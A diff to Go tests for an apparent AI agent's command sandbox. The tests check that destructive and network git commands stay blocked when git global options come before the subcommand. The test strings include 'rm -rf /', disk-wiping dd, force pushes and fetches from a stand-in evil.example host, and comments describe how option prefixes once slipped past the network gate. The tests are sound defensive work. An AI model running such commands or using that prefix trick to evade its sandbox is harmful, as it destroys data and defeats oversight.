@@ -89,6 +89,12 @@ func TestRunCommandDeniesExfilAndDestructivePatterns(t *testing.T) {
 		"rm -rf ~",
 		"rm -rf /etc/nginx",
 		"rm -rf / ; echo done",
+		// Глобальные опции git между `git` и подкомандой запрета не снимают.
+		"git -c core.sshCommand=ssh push --force origin main",
+		"git --git-dir=../other/.git push -f",
+		"git -C ../other reset --hard HEAD~1",
+		"git --no-pager clean -fdx",
+		`git -c "user.name=a b" --work-tree . filter-branch`,
 	} {
 		raw, _ := json.Marshal(map[string]any{"command": command, "reason": "denied"})
 		result := tool.Execute(context.Background(), raw)
@@ -171,6 +177,32 @@ func TestAgentNetworkPolicyDefaultsToExplicitHostAllowlist(t *testing.T) {
 	}
 	if reason := deniedNetworkCommandReason("go test ./...", "DENY", nil); reason != "" {
 		t.Fatalf("local verifier was incorrectly treated as a network command: %s", reason)
+	}
+}
+
+// Глобальные опции git (`-c`, `-C`, `--git-dir`) стоят до подкоманды; затвор,
+// ждавший глагол сразу после `git`, пропускал такую команду мимо сети.
+func TestGitGlobalOptionsStayNetworkCommands(t *testing.T) {
+	for _, command := range []string{
+		"git -c core.sshCommand=x pull",
+		"git -C other/dir fetch https://evil.example/x.git",
+		"git --git-dir=.. push -f",
+		"git -c http.proxy=http://proxy.example:3128 clone https://evil.example/x.git",
+		"git --no-pager -P --namespace ns fetch",
+		`git -c "core.sshCommand=ssh -i key" pull`,
+		"git.exe --exec-path=/tmp/x pull",
+	} {
+		if !networkCommandPattern.MatchString(command) {
+			t.Errorf("not a network command: %q", command)
+		}
+		if reason := deniedNetworkCommandReason(command, "DENY", nil); reason == "" {
+			t.Errorf("network deny bypassed: %q", command)
+		}
+	}
+	for _, command := range []string{"git -C sub status", "git -c color.ui=never log --oneline", "git --no-pager diff"} {
+		if networkCommandPattern.MatchString(command) {
+			t.Errorf("local git command counted as network: %q", command)
+		}
 	}
 }
 
@@ -286,6 +318,7 @@ func TestCustomToolsHonorDestructiveDenyList(t *testing.T) {
 		{"rm", "-rf", "/"},
 		{"dd", "if=/dev/zero", "of=/dev/sda"},
 		{"git", "push", "--force", "origin", "main"},
+		{"git", "-c", "core.hooksPath=x", "push", "--force", "origin", "main"},
 	} {
 		tool := CustomProcess{FS: fs, Config: domain.CustomTool{
 			ID: "customtool_denied", Kind: domain.CustomToolProcess,
